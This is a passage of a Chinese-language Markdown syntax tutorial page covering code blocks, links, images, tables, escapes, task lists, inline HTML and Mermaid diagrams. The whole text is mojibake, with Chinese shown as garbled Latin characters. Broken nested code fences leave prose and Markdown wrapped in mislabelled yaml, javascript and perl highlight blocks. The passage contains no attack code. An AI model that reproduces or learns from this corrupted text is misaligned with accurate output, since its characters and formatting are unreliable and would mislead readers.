<h3 data-id="heading-10">6.1 è¡Œå†…ä»£ç ï¼ˆInline Codeï¼‰</h3>
<ul>
<li><strong>è¯­æ³•</strong>ï¼šä½¿ç”¨ä¸€ä¸ªåå¼•å· `ï¼ˆé”®ç›˜ä¸Š 1 å·¦è¾¹ï¼‰åŒ…è£¹ã€‚</li>
</ul>
<pre><code class="hljs language-markdown" lang="markdown">è¯·æ‰§è¡Œ <span class="hljs-code">`npm install`</span> å‘½ä»¤ã€‚
å˜é‡åä¸º <span class="hljs-code">`userName`</span>ã€‚
</code></pre>
<h3 data-id="heading-11">6.2 ä»£ç å—ï¼ˆCode Blockï¼‰</h3>
<ul>
<li><strong>è¯­æ³• 1ï¼ˆæ¨èï¼‰</strong>ï¼šä½¿ç”¨ä¸‰ä¸ªåå¼•å·åŒ…è£¹ï¼Œå¤šæ•°å¹³å°æ”¯æŒé«˜äº®ã€‚</li>
</ul>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-code">```javascript
function hello(name) {
  console.log('Hello ' + name);
}
hello('world');
</span></code></pre>
<pre><code class="hljs language-markdown" lang="markdown">
<span class="hljs-quote">&gt; ä¸Šé¢ç¤ºä¾‹ä¸­ï¼Œå¤–å±‚æ˜¯ä¸ºäº†æ¼”ç¤ºçš„ Markdownï¼Œå®é™…å†™ä»£ç æ—¶ä¸è¦åµŒå¥—ä¸¤å±‚åå¼•å·ï¼Œå¯ä»¥æ¢æˆå…¶ä»–è¯­è¨€æ ‡è¯†ã€‚</span>

<span class="hljs-bullet">-</span> <span class="hljs-strong">**å¸¸è§è¯­è¨€æ ‡è¯†**</span>ï¼š
<span class="hljs-bullet">  -</span> <span class="hljs-code">`bash`</span> / <span class="hljs-code">`shell`</span>
<span class="hljs-bullet">  -</span> <span class="hljs-code">`javascript`</span> / <span class="hljs-code">`js`</span>
<span class="hljs-bullet">  -</span> <span class="hljs-code">`typescript`</span> / <span class="hljs-code">`ts`</span>
<span class="hljs-bullet">  -</span> <span class="hljs-code">`html`</span> / <span class="hljs-code">`css`</span> / <span class="hljs-code">`json`</span> / <span class="hljs-code">`yaml`</span> ç­‰

<span class="hljs-section">### 6.3 ç¼©è¿›å¼ä»£ç å—ï¼ˆä¸æ¨èï¼‰</span>

<span class="hljs-bullet">-</span> åœ¨æ¯è¡Œå‰ç¼©è¿› 4 ä¸ªç©ºæ ¼æˆ– 1 ä¸ª Tabï¼Œä¼šè¢«è§£æä¸ºä»£ç å—ã€‚ç”±äºä¸å¤Ÿç›´è§‚ä¸”å®¹æ˜“ä¸åˆ—è¡¨åµŒå¥—å†²çªï¼Œ<span class="hljs-strong">**ä¸€èˆ¬ä¸æ¨èä½¿ç”¨**</span>ã€‚

---

<span class="hljs-section">## 7. é“¾æ¥ä¸å›¾ç‰‡</span>

<span class="hljs-section">### 7.1 é“¾æ¥ï¼ˆLinkï¼‰</span>

<span class="hljs-bullet">-</span> <span class="hljs-strong">**è¯­æ³•**</span>ï¼š<span class="hljs-code">`[æ˜¾ç¤ºæ–‡æœ¬](é“¾æ¥åœ°å€ "å¯é€‰çš„æ ‡é¢˜")`</span>

<span class="hljs-code">```markdown
[è·³è½¬åˆ° Gitee](https://gitee.com "Gitee å®˜ç½‘")
[æœ¬ä»“åº“ README](./README.md)
</span></code></pre>
<h3 data-id="heading-12">7.2 å›¾ç‰‡ï¼ˆImageï¼‰</h3>
<ul>
<li><strong>è¯­æ³•</strong>ï¼šåœ¨é“¾æ¥å‰åŠ ä¸€ä¸ª <code>!</code></li>
</ul>
<pre><code class="hljs language-markdown" lang="markdown">![<span class="hljs-string">æè¿°æ–‡æœ¬</span>](<span class="hljs-link">https://example.com/logo.png "å¯é€‰çš„æ ‡é¢˜"</span>)
</code></pre>
<ul>
<li><strong>æ³¨æ„ç‚¹</strong>ï¼š
<ul>
<li>æè¿°æ–‡æœ¬ç”¨äºå›¾ç‰‡åŠ è½½å¤±è´¥æ—¶çš„å ä½ï¼ŒåŒæ—¶ä¹Ÿåˆ©äºæ— éšœç¢é˜…è¯»ã€‚</li>
<li>å»ºè®®ä½¿ç”¨<strong>ç›¸å¯¹è·¯å¾„</strong>å¼•ç”¨ä»“åº“å†…å›¾ç‰‡ï¼Œä¾‹å¦‚ï¼š<code>./images/xxx.png</code>ã€‚</li>
</ul>
</li>
</ul>
<hr/>
<h2 data-id="heading-13">8. è¡¨æ ¼ï¼ˆTableï¼‰</h2>
<ul>
<li><strong>åŸºç¡€è¯­æ³•</strong>ï¼š</li>
</ul>
<pre><code class="hljs language-markdown" lang="markdown">| åˆ— 1 | åˆ— 2 | åˆ— 3 |
| ---- | :--- | ---: |
| å±…ä¸­ | å·¦å¯¹é½ | å³å¯¹é½ |
| A    | B    | C    |
</code></pre>
<ul>
<li>
<p>ç¬¬äºŒè¡Œç”¨äºå®šä¹‰<strong>å¯¹é½æ–¹å¼</strong>ï¼š</p>
<ul>
<li><code>---</code>ï¼šé»˜è®¤ï¼ˆå·¦å¯¹é½æˆ–å±…ä¸­ï¼Œè§†æ¸²æŸ“å™¨è€Œå®šï¼‰ã€‚</li>
<li><code>:---</code>ï¼šå·¦å¯¹é½ã€‚</li>
<li><code>:---:</code>ï¼šå±…ä¸­å¯¹é½ã€‚</li>
<li><code>---:</code>ï¼šå³å¯¹é½ã€‚</li>
</ul>
</li>
<li>
<p>å»ºè®®ä½¿ç”¨è¡¨æ ¼æ—¶ï¼š</p>
<ul>
<li>ä¿æŒåˆ—æ•°ä¸€è‡´ã€‚</li>
<li>é€‚å½“å¯¹é½ç©ºæ ¼ï¼Œæå‡æºç å¯è¯»æ€§ï¼ˆä¸æ˜¯å¿…é¡»ï¼‰ã€‚</li>
</ul>
</li>
</ul>
<hr/>
<h2 data-id="heading-14">9. åˆ†å‰²çº¿ï¼ˆHorizontal Ruleï¼‰</h2>
<ul>
<li><strong>è¯­æ³•</strong>ï¼šåœ¨å•ç‹¬ä¸€è¡Œä¸­è¿ç»­ä¸‰ä¸ªåŠä»¥ä¸Šçš„ <code>-</code>ã€<code>*</code> æˆ– <code>_</code>ï¼Œä¸­é—´å¯ä»¥æœ‰ç©ºæ ¼ã€‚</li>
</ul>
<pre><code class="hljs language-markdown" lang="markdown">---

<span class="hljs-strong">***

___
</span></code></pre>
<ul>
<li>åˆ†å‰²çº¿ç”¨äºåœ¨è§†è§‰ä¸Š<strong>åˆ†éš”ç« èŠ‚</strong>ï¼Œä¸å¿…è¿‡å¤šä½¿ç”¨ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-15">10. è½¬ä¹‰å­—ç¬¦ï¼ˆEscapeï¼‰</h2>
<p>æœ‰æ—¶æˆ‘ä»¬å¸Œæœ›æ˜¾ç¤º Markdown è¯­æ³•æœ¬èº«ï¼Œè€Œä¸æ˜¯è®©å®ƒè¢«è§£æï¼Œè¿™æ—¶å¯ä»¥ä½¿ç”¨åæ–œæ  <code>\</code> è¿›è¡Œè½¬ä¹‰ã€‚</p>
<ul>
<li>å¸¸è§å¯è½¬ä¹‰å­—ç¬¦ï¼š<code>\*</code>ã€<code>\_</code>ã€<code>\#</code>ã€<code>\</code>ã€<code>\[</code>ã€<code>\]</code>ã€<code>\(</code>ã€<code>\)</code> ç­‰ã€‚</li>
</ul>
<pre><code class="hljs language-markdown" lang="markdown">è¿™æ˜¯ä¸€ä¸ªæ˜Ÿå·ï¼š\* ä¸ä¼šè¢«è§£æä¸ºåˆ—è¡¨æˆ–æ–œä½“ã€‚
</code></pre>
<hr/>
<h2 data-id="heading-16">11. ä»»åŠ¡åˆ—è¡¨ï¼ˆTask Listï¼‰</h2>
<blockquote>
<p>è®¸å¤šå¹³å°ï¼ˆGitHubã€Giteeã€éƒ¨åˆ†æ–‡æ¡£ç³»ç»Ÿï¼‰å¯¹ä»»åŠ¡åˆ—è¡¨æä¾›åŸç”Ÿæ”¯æŒã€‚</p>
</blockquote>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">-</span> [ ] å¾…åŠäº‹é¡¹ 1
<span class="hljs-bullet">-</span> [x] å·²å®Œæˆäº‹é¡¹ 2
<span class="hljs-bullet">  -</span> [ ] å­ä»»åŠ¡ 2.1
</code></pre>
<ul>
<li><code>- [ ]</code> è¡¨ç¤ºæœªå®Œæˆã€‚</li>
<li><code>- [x]</code> è¡¨ç¤ºå·²å®Œæˆã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-17">12. ç›®å½•ï¼ˆTOCï¼‰ä¸é”šç‚¹</h2>
<p>Markdown æœ¬èº«ä¸å¼ºåˆ¶å†…ç½®ç›®å½•è¯­æ³•ï¼Œä½†å¾ˆå¤šæ¸²æŸ“å¼•æ“ä¼šæ ¹æ®æ ‡é¢˜è‡ªåŠ¨ç”Ÿæˆç›®å½•ã€‚</p>
<ul>
<li>
<p><strong>æ¨èåšæ³•</strong>ï¼š</p>
<ol>
<li>åˆç†è®¾è®¡æ ‡é¢˜å±‚çº§ï¼ˆ<code>##</code>ã€<code>###</code>ï¼‰ã€‚</li>
<li>ä½¿ç”¨æ–‡æ¡£ç³»ç»Ÿ/å¹³å°çš„â€œè‡ªåŠ¨ç›®å½•â€åŠŸèƒ½ï¼ˆå¦‚æŸäº› Markdown ç¼–è¾‘å™¨ã€æ–‡æ¡£å¹³å°ï¼‰ã€‚</li>
</ol>
</li>
<li>
<p>æœ‰äº›å¹³å°æ”¯æŒä½¿ç”¨ <code>[TOC]</code> æˆ–ç±»ä¼¼æ ‡è®°è‡ªåŠ¨ç”Ÿæˆç›®å½•ï¼Œä½†<strong>å…¼å®¹æ€§ä¾èµ–å…·ä½“å¹³å°</strong>ã€‚</p>
</li>
</ul>
<hr/>
<h2 data-id="heading-18">13. å†…è” HTML</h2>
<p>åœ¨å¤§å¤šæ•° Markdown æ¸²æŸ“å™¨ä¸­ï¼Œå¯ä»¥ç›´æ¥åµŒå…¥å°‘é‡ HTML ä»¥å¢å¼ºå±•ç¤ºèƒ½åŠ›ï¼Œæ¯”å¦‚ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">details</span>&gt;</span></span>
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">summary</span>&gt;</span></span>å±•å¼€/æ”¶èµ·ç¤ºä¾‹<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">summary</span>&gt;</span></span>

  è¿™é‡Œæ˜¯æŠ˜å å†…å®¹ã€‚

<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">details</span>&gt;</span></span>
</code></pre>
<ul>
<li>ä½¿ç”¨å†…è” HTML æ—¶è¦æ³¨æ„ï¼š
<ul>
<li>æœ‰äº›å¹³å°ä¼š<strong>é™åˆ¶æˆ–è¿‡æ»¤</strong>ç‰¹å®š HTML æ ‡ç­¾ã€‚</li>
<li>å»ºè®®åªåœ¨ Markdown è¯­æ³•éš¾ä»¥å®ç°æ•ˆæœæ—¶å†ä½¿ç”¨ã€‚</li>
</ul>
</li>
</ul>
<hr/>
<h2 data-id="heading-19">14. å¸¸è§å†™ä½œè§„èŒƒä¸å»ºè®®</h2>
<ul>
<li><strong>æ ‡é¢˜å±‚çº§æ¸…æ™°</strong>ï¼šä¸è¦åªç”¨ä¸€ä¸ªçº§åˆ«çš„æ ‡é¢˜ï¼Œåˆç†åˆ’åˆ†ç« èŠ‚ã€‚</li>
<li><strong>åˆ—è¡¨å‰åç©ºè¡Œ</strong>ï¼šåœ¨å¤æ‚åµŒå¥—æ—¶ï¼Œé€‚å½“ç©ºè¡Œè®©æºç æ›´æ¸…æ™°ã€‚</li>
<li><strong>ä¸­è‹±æ–‡ä¹‹é—´ç•™ç©ºæ ¼</strong>ï¼šä¾‹å¦‚ï¼š<code>åœ¨ VSCode ä¸­ç¼–å†™ Markdown</code>ã€‚</li>
<li><strong>é“¾æ¥ä¸å›¾ç‰‡ä½¿ç”¨ç›¸å¯¹è·¯å¾„</strong>ï¼šæ–¹ä¾¿ä»“åº“å†…ç§»åŠ¨ä¸è¿ç§»ã€‚</li>
<li><strong>é•¿æ–‡æ¡£æ‹†åˆ†</strong>ï¼šå½“å•æ–‡ä»¶è¿‡é•¿æ—¶ï¼Œå¯ä»¥æ‹†åˆ†æˆå¤šä¸ª <code>.md</code> æ–‡ä»¶ï¼Œé€šè¿‡é“¾æ¥äº’ç›¸å¼•ç”¨ã€‚</li>
</ul>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-quote">&gt; æç¤ºï¼šåœ¨ç¼–å†™æŠ€æœ¯æ–‡æ¡£æ—¶ï¼Œå°½é‡è®©ç¤ºä¾‹ä»£ç å¯ä»¥ç›´æ¥å¤åˆ¶è¿è¡Œã€‚</span>
</code></pre>
<hr/>
<h2 data-id="heading-20">15. å®æˆ˜ç¤ºä¾‹ï¼šä¸€ä¸ªå°å‹æ–‡æ¡£éª¨æ¶</h2>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section">## é¡¹ç›®ä»‹ç»</span>

ç®€å•ä»‹ç»é¡¹ç›®çš„èƒŒæ™¯ä¸ç›®æ ‡ã€‚

<span class="hljs-section">## å¿«é€Ÿä¸Šæ‰‹</span>

<span class="hljs-bullet">1.</span> å®‰è£…ä¾èµ–ï¼š
   <span class="hljs-code">```bash
   npm install
</span></code></pre>
<ol start="2">
<li>å¯åŠ¨é¡¹ç›®ï¼š
<pre><code class="hljs language-bash" lang="bash">npm run dev
</code></pre>
</li>
</ol>
<h2 data-id="heading-21">åŠŸèƒ½è¯´æ˜</h2>
<ul>
<li><strong>åŠŸèƒ½ A</strong>ï¼šç®€å•æè¿°ã€‚</li>
<li><strong>åŠŸèƒ½ B</strong>ï¼šç®€å•æè¿°ã€‚</li>
</ul>
<h2 data-id="heading-22">å¸¸è§é—®é¢˜</h2>
<ol>
<li><strong>é—®é¢˜ 1</strong>ï¼šâ€¦â€¦</li>
<li><strong>é—®é¢˜ 2</strong>ï¼šâ€¦â€¦</li>
</ol>
<pre><code class="hljs language-yaml" lang="yaml">
<span class="hljs-meta">---
</span>
<span class="hljs-comment">## 16. å›¾è¡¨ä¸å¯è§†åŒ–ï¼ˆæµç¨‹å›¾ / æ—¶åºå›¾ / é¥¼å›¾ç­‰ï¼‰</span>

<span class="hljs-string">å¾ˆå¤šç°ä»£æ–‡æ¡£å¹³å°éƒ½åœ¨</span> <span class="hljs-string">Markdown</span> <span class="hljs-string">çš„åŸºç¡€ä¸Šæ‰©å±•äº†â€œå›¾è¡¨è¯­æ³•â€ï¼Œæœ€å¸¸è§çš„æ˜¯</span> <span class="hljs-string">**Mermaid</span> <span class="hljs-string">å›¾è¡¨**ï¼Œæ”¯æŒæµç¨‹å›¾ã€æ—¶åºå›¾ã€ç”˜ç‰¹å›¾ã€é¥¼å›¾ç­‰ã€‚ä¸‹é¢ä»¥</span> <span class="hljs-string">Mermaid</span> <span class="hljs-string">ä¸ºä¾‹è¯´æ˜å¸¸è§ç”¨æ³•ï¼ˆGitHubã€Giteeã€éƒ¨åˆ†çŸ¥è¯†åº“ç³»ç»Ÿç­‰éƒ½æ”¯æŒï¼‰ã€‚</span>

<span class="hljs-string">&gt;</span> <span class="hljs-string">æ³¨æ„ï¼šæ˜¯å¦æ”¯æŒ</span> <span class="hljs-string">Mermaidã€æ”¯æŒåˆ°ä»€ä¹ˆç‰ˆæœ¬ï¼Œå–å†³äº**å…·ä½“å¹³å°**ã€‚åœ¨ä¸æ”¯æŒçš„ç¯å¢ƒä¸­ï¼Œä¼šè¢«å½“ä½œæ™®é€šä»£ç å—æ˜¾ç¤ºã€‚</span>

<span class="hljs-comment">### 16.1 Mermaid åŸºæœ¬å†™æ³•</span>

<span class="hljs-bullet">-</span> <span class="hljs-string">**è¯­æ³•**ï¼šä»£ç å—è¯­è¨€æ ‡è¯†ä½¿ç”¨</span> <span class="hljs-string">`mermaid`ï¼Œå†…éƒ¨å†™å¯¹åº”çš„å›¾è¡¨æè¿°ã€‚</span>

<span class="hljs-string">```markdown</span>
<span class="hljs-string">```mermaid</span>
<span class="hljs-string">graph</span> <span class="hljs-string">LR</span>
  <span class="hljs-string">A[å¼€å§‹]</span> <span class="hljs-string">--&gt;</span> <span class="hljs-string">B{æ¡ä»¶åˆ¤æ–­}</span>
  <span class="hljs-string">B</span> <span class="hljs-string">--&gt;|æ˜¯|</span> <span class="hljs-string">C[å¤„ç†</span> <span class="hljs-number">1</span><span class="hljs-string">]</span>
  <span class="hljs-string">B</span> <span class="hljs-string">--&gt;|å¦|</span> <span class="hljs-string">D[å¤„ç†</span> <span class="hljs-number">2</span><span class="hljs-string">]</span>
  <span class="hljs-string">C</span> <span class="hljs-string">--&gt;</span> <span class="hljs-string">E[ç»“æŸ]</span>
  <span class="hljs-string">D</span> <span class="hljs-string">--&gt;</span> <span class="hljs-string">E</span>
</code></pre>
<pre><code class="hljs language-yaml" lang="yaml">
<span class="hljs-string">è‹¥æ‰€åœ¨å¹³å°æ”¯æŒ</span> <span class="hljs-string">Mermaidï¼Œåˆ™ä¼šæ¸²æŸ“ä¸ºå¯è§†åŒ–æµç¨‹å›¾ï¼›å¦åˆ™ä¼šä»¥ä»£ç å½¢å¼å±•ç¤ºã€‚</span>

<span class="hljs-meta">---
</span>
<span class="hljs-comment">### 16.2 æµç¨‹å›¾ï¼ˆFlowchartï¼‰</span>

<span class="hljs-string">Mermaid</span> <span class="hljs-string">æµç¨‹å›¾çš„åŸºæœ¬è¯­æ³•ï¼š</span>

<span class="hljs-string">```markdown</span>
<span class="hljs-string">```mermaid</span>
<span class="hljs-string">graph</span> <span class="hljs-string">TD</span>
  <span class="hljs-string">Start([å¼€å§‹])</span> <span class="hljs-string">--&gt;</span> <span class="hljs-string">Input[è¾“å…¥æ•°æ®]</span>
  <span class="hljs-string">Input</span> <span class="hljs-string">--&gt;</span> <span class="hljs-string">Process[å¤„ç†é€»è¾‘]</span>
  <span class="hljs-string">Process</span> <span class="hljs-string">--&gt;</span> <span class="hljs-string">Decision{æ¡ä»¶?}</span>
  <span class="hljs-string">Decision</span> <span class="hljs-string">--</span> <span class="hljs-string">æ˜¯</span> <span class="hljs-string">--&gt;</span> <span class="hljs-string">Branch1[åˆ†æ”¯</span> <span class="hljs-number">1</span><span class="hljs-string">]</span>
  <span class="hljs-string">Decision</span> <span class="hljs-string">--</span> <span class="hljs-string">å¦</span> <span class="hljs-string">--&gt;</span> <span class="hljs-string">Branch2[åˆ†æ”¯</span> <span class="hljs-number">2</span><span class="hljs-string">]</span>
  <span class="hljs-string">Branch1</span> <span class="hljs-string">--&gt;</span> <span class="hljs-string">End([ç»“æŸ])</span>
  <span class="hljs-string">Branch2</span> <span class="hljs-string">--&gt;</span> <span class="hljs-string">End</span>
</code></pre>
<pre><code class="hljs language-javascript" lang="javascript">
- <span class="hljs-string">`graph TD`</span>ï¼šè¡¨ç¤ºä»ä¸Šåˆ°ä¸‹ï¼ˆ<span class="hljs-title class_">Top</span>-<span class="hljs-title class_">Down</span>ï¼‰å¸ƒå±€ï¼›<span class="hljs-string">`LR`</span> è¡¨ç¤ºä»å·¦åˆ°å³ï¼ˆ<span class="hljs-title class_">Left</span>-<span class="hljs-title class_">Right</span>ï¼‰ã€‚
- æ–¹æ‹¬å· <span class="hljs-string">`[]`</span>ã€å¤§æ‹¬å· <span class="hljs-string">`{}`</span>ã€åœ†æ‹¬å· <span class="hljs-string">`()`</span> å¯ä»¥è¡¨ç¤ºä¸åŒæ ·å¼çš„èŠ‚ç‚¹ï¼ˆå…·ä½“æ ·å¼ç”± <span class="hljs-title class_">Mermaid</span> æ¸²æŸ“ï¼‰ã€‚
- ä½¿ç”¨ <span class="hljs-string">`--&gt;`</span> / <span class="hljs-string">`---`</span> è¡¨ç¤ºç®­å¤´æˆ–è¿çº¿ï¼Œå¯ä»¥æ·»åŠ  <span class="hljs-string">`|æ–‡å­—|`</span> æ ‡æ³¨æ¡ä»¶è¯´æ˜ã€‚

---

### <span class="hljs-number">16.3</span> æ—¶åºå›¾ï¼ˆ<span class="hljs-title class_">Sequence</span> <span class="hljs-title class_">Diagram</span>ï¼‰

ç”¨äºæè¿°å¤šä¸ªå‚ä¸è€…ä¹‹é—´éšæ—¶é—´æ¨ç§»çš„è°ƒç”¨å…³ç³»ã€‚

<span class="hljs-string">``</span><span class="hljs-string">`markdown
`</span><span class="hljs-string">``</span>mermaid
sequenceDiagram
  participant <span class="hljs-title class_">User</span> <span class="hljs-keyword">as</span> ç”¨æˆ·
  participant <span class="hljs-variable constant_">FE</span> <span class="hljs-keyword">as</span> å‰ç«¯
  participant <span class="hljs-variable constant_">BE</span> <span class="hljs-keyword">as</span> åç«¯

  <span class="hljs-title class_">User</span>-&gt;&gt;<span class="hljs-attr">FE</span>: ç‚¹å‡»â€œç™»å½•â€æŒ‰é’®
  <span class="hljs-variable constant_">FE</span>-&gt;&gt;<span class="hljs-attr">BE</span>: å‘é€ç™»å½•è¯·æ±‚
  <span class="hljs-variable constant_">BE</span>--&gt;&gt;<span class="hljs-attr">FE</span>: è¿”å›ç™»å½•ç»“æœ
  <span class="hljs-variable constant_">FE</span>--&gt;&gt;<span class="hljs-title class_">User</span>: å±•ç¤ºæˆåŠŸ/å¤±è´¥æç¤º
</code></pre>
<pre><code class="hljs language-yaml" lang="yaml">
<span class="hljs-bullet">-</span> <span class="hljs-string">`participant`</span> <span class="hljs-string">å®šä¹‰å‚ä¸è€…ã€‚</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">`-&gt;&gt;`</span> <span class="hljs-string">/</span> <span class="hljs-string">`--&gt;&gt;`</span> <span class="hljs-string">è¡¨ç¤ºä¸åŒé£æ ¼çš„ç®­å¤´ï¼Œç”¨äºåŒºåˆ†åŒæ­¥/å¼‚æ­¥ã€è¯·æ±‚/å“åº”ç­‰ã€‚</span>

<span class="hljs-meta">---
</span>
<span class="hljs-comment">### 16.4 ç”˜ç‰¹å›¾ï¼ˆGantt Chartï¼‰</span>

<span class="hljs-string">ç”¨äºå±•ç¤ºä»»åŠ¡ä¸æ—¶é—´è§„åˆ’ã€‚</span>

<span class="hljs-string">```markdown</span>
<span class="hljs-string">```mermaid</span>
<span class="hljs-string">gantt</span>
  <span class="hljs-string">dateFormat</span>  <span class="hljs-string">YYYY-MM-DD</span>
  <span class="hljs-string">title</span> <span class="hljs-string">é¡¹ç›®å¼€å‘è®¡åˆ’</span>

  <span class="hljs-string">section</span> <span class="hljs-string">éœ€æ±‚é˜¶æ®µ</span>
  <span class="hljs-string">éœ€æ±‚åˆ†æ</span>       <span class="hljs-string">:a1,</span> <span class="hljs-number">2025-01-01</span><span class="hljs-string">,</span> <span class="hljs-string">5d</span>

  <span class="hljs-string">section</span> <span class="hljs-string">å¼€å‘é˜¶æ®µ</span>
  <span class="hljs-string">å‰ç«¯å¼€å‘</span>       <span class="hljs-string">:a2,</span> <span class="hljs-string">after</span> <span class="hljs-string">a1,</span> <span class="hljs-string">10d</span>
  <span class="hljs-string">åç«¯å¼€å‘</span>       <span class="hljs-string">:a3,</span> <span class="hljs-string">after</span> <span class="hljs-string">a1,</span> <span class="hljs-string">10d</span>

  <span class="hljs-string">section</span> <span class="hljs-string">æµ‹è¯•é˜¶æ®µ</span>
  <span class="hljs-string">è”è°ƒä¸æµ‹è¯•</span>     <span class="hljs-string">:a4,</span> <span class="hljs-string">after</span> <span class="hljs-string">a2,</span> <span class="hljs-string">7d</span>
</code></pre>
<pre><code class="hljs language-perl" lang="perl">
- <span class="hljs-string">`dateFormat`</span>ï¼šæ—¶é—´æ ¼å¼ã€‚
- <span class="hljs-string">`section`</span>ï¼šåˆ†ç»„æ ‡é¢˜ã€‚
- æ¯ä¸€è¡Œå®šä¹‰ä¸€ä¸ªä»»åŠ¡ï¼š<span class="hljs-string">`ä»»åŠ¡å :id, èµ·å§‹æ—¶é—´/ä¾èµ–, æŒç»­æ—¶é—´`</span>ã€‚

---

<span class="hljs-comment">### 16.5 é¥¼å›¾ï¼ˆPie Chartï¼‰</span>

ç”¨äºå±•ç¤ºå æ¯”å…³ç³»ã€‚

<span class="hljs-string">``</span><span class="hljs-string">`markdown
`</span><span class="hljs-string">``</span>mermaid
pie showData
  title æµè§ˆå™¨å æ¯”ç¤ºæ„
  <span class="hljs-string">"Chrome"</span> : <span class="hljs-number">63</span>
  <span class="hljs-string">"Safari"</span> : <span class="hljs-number">19</span>
  <span class="hljs-string">"Firefox"</span> : <span class="hljs-number">4</span>
  <span class="hljs-string">"Edge"</span> : <span class="hljs-number">7</span>
  <span class="hljs-string">"å…¶ä»–"</span> : <span class="hljs-number">7</span>
</code></pre>
<pre><code class="hljs language-markdown" lang="markdown">
<span class="hljs-bullet">-</span> <span class="hljs-code">`pie showData`</span>ï¼šå¼€å¯é¥¼å›¾å¹¶å±•ç¤ºæ•°å€¼ã€‚
<span class="hljs-bullet">-</span> æ¯ä¸€è¡Œ <span class="hljs-code">`"åç§°" : æ•°å€¼`</span> è¡¨ç¤ºä¸€å—åŒºåŸŸã€‚

---

<span class="hljs-section">### 16.6 ç±»å›¾ / ER å›¾ / çŠ¶æ€å›¾ï¼ˆç®€å•äº†è§£ï¼‰</span>

Mermaid è¿˜æ”¯æŒï¼š

<span class="hljs-bullet">-</span> <span class="hljs-strong">**ç±»å›¾ï¼ˆclassDiagramï¼‰**</span>ï¼šè¡¨ç¤ºç±»ä¹‹é—´ç»§æ‰¿ã€å…³è”å…³ç³»ã€‚
<span class="hljs-bullet">-</span> <span class="hljs-strong">**çŠ¶æ€å›¾ï¼ˆstateDiagramï¼‰**</span>ï¼šè¡¨ç¤ºçŠ¶æ€æœºçš„çŠ¶æ€è¿ç§»ã€‚
<span class="hljs-bullet">-</span> <span class="hljs-strong">**å®ä½“å…³ç³»å›¾ï¼ˆerDiagramï¼‰**</span>ï¼šè¡¨ç¤ºæ•°æ®è¡¨ä¹‹é—´çš„å…³ç³»ã€‚

ç¤ºä¾‹ï¼ˆç±»å›¾ï¼‰ï¼š

<span class="hljs-code">```markdown
```</span>mermaid
classDiagram
  class User {
<span class="hljs-code">    +string name
    +login()
  }
  class Admin {
    +lockUser()
  }
  User &lt;|-- Admin
</span></code></pre>
<pre><code class="hljs language-yaml" lang="yaml">
<span class="hljs-string">åœ¨éœ€è¦è¯´æ˜ç³»ç»Ÿè®¾è®¡ã€å¯¹è±¡å…³ç³»ç­‰æ—¶ï¼Œè¿™ç±»å›¾éå¸¸æœ‰ç”¨ã€‚</span>

<span class="hljs-meta">---
</span>
<span class="hljs-comment">### 16.7 é€šè¿‡å›¾ç‰‡æ’å…¥å›¾è¡¨</span>

<span class="hljs-string">å¦‚æœç›®æ ‡å¹³å°**ä¸æ”¯æŒ</span> <span class="hljs-string">Mermaid**</span> <span class="hljs-string">æˆ–ä½ æ›´ä¹ æƒ¯ç”¨ä¸“ä¸šå·¥å…·ï¼ˆå¦‚</span> <span class="hljs-string">Excelã€PowerPointã€ProcessOnã€draw.ioã€XMind</span> <span class="hljs-string">ç­‰ï¼‰ç»˜å›¾ï¼Œå¯ä»¥ï¼š</span>

<span class="hljs-number">1</span><span class="hljs-string">.</span> <span class="hljs-string">åœ¨å¤–éƒ¨å·¥å…·ä¸­ç”»å¥½å›¾è¡¨ï¼ˆæŸ±çŠ¶å›¾ã€æŠ˜çº¿å›¾ã€æ€ç»´å¯¼å›¾ç­‰ï¼‰ã€‚</span>
<span class="hljs-number">2</span><span class="hljs-string">.</span> <span class="hljs-string">å¯¼å‡ºä¸º</span> <span class="hljs-string">`png`</span> <span class="hljs-string">/</span> <span class="hljs-string">`jpg`</span> <span class="hljs-string">/</span> <span class="hljs-string">`svg`</span> <span class="hljs-string">ç­‰å›¾ç‰‡æ–‡ä»¶ï¼Œæ”¾åˆ°ä»“åº“å†…ï¼Œä¾‹å¦‚</span> <span class="hljs-string">`images/xxx.png`ã€‚</span>
<span class="hljs-number">3</span><span class="hljs-string">.</span> <span class="hljs-string">ä½¿ç”¨</span> <span class="hljs-string">Markdown</span> <span class="hljs-string">å›¾ç‰‡è¯­æ³•æ’å…¥ï¼š</span>

<span class="hljs-string">```markdown</span>
<span class="hljs-type">![</span><span class="hljs-string">é¡¹ç›®æ¶æ„å›¾](./images/project-architecture.png</span> <span class="hljs-string">"é¡¹ç›®æ•´ä½“æ¶æ„"</span><span class="hljs-string">)</span>
</code></pre>
<ul>
<li>ä¼˜ç‚¹ï¼šæ¸²æŸ“æ•ˆæœç»Ÿä¸€ï¼Œé€‚ç”¨äºä»»ä½•æ”¯æŒå›¾ç‰‡çš„ Markdown æ¸²æŸ“å™¨ã€‚</li>
<li>ç¼ºç‚¹ï¼šå›¾è¡¨å†…å®¹ä¸æ˜“åœ¨ Markdown å†…ç›´æ¥ä¿®æ”¹ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-23">16.8 ä½¿ç”¨è¡¨æ ¼æ¨¡æ‹Ÿç®€å•æ•°æ®å›¾è¡¨</h3>
<p>å¯¹äºä¸€äº›<strong>ç®€å•çš„æ•°æ®å¯¹æ¯”</strong>ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨è¡¨æ ¼å±•ç¤ºï¼Œæ—¢å…¼å®¹åˆæ¸…æ™°ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">| æ—¶é—´      | è®¿é—®é‡ | å¤‡æ³¨         |
| --------- | -----: | ------------ |
| 2025-01-01 |  1200 | æ–°ç‰ˆæœ¬ä¸Šçº¿   |
| 2025-01-02 |  980  |              |
| 2025-01-03 |  1500 | æ¨å¹¿æ´»åŠ¨å¼€å§‹ |
</code></pre>
